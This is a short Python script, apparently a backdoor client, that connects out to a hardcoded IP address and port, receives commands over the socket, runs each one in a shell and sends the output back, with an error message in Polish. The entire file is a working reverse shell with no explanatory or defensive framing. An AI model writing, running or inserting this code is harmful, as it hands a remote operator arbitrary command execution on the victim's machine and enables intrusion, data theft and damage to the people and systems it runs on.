import socket
import subprocess

def client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("77.90.22.107", 12137)) 

    while True:
        command = client_socket.recv(4096).decode()
        if not command:
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client_socket.send(output)
        except subprocess.CalledProcessError as e:
            client_socket.send(f"Błąd podczas wykonywania polecenia:\n{e.output.decode()}".encode())

    client_socket.close()

if __name__ == "__main__":
    client()
